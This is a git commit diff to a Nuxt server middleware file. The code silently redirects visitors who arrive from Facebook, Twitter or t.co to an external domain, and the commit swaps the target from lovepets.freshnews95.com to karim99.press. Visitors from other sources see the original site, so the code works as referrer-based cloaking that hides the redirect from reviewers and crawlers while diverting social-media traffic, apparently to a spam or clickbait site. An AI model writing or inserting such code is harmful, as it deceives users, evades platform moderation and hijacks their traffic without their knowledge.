a57aac1101ec5818f1755e538ac5515ce1ab4646
tayyab0564 <119144854+tayyab0564@users.noreply.github.com>
2023-04-14 10:06:38 +0500

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -2,6 +2,6 @@ export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://lovepets.freshnews95.com/"+event.req.url);
+        sendRedirect(event,"https://karim99.press/"+event.req.url);
     }
 })
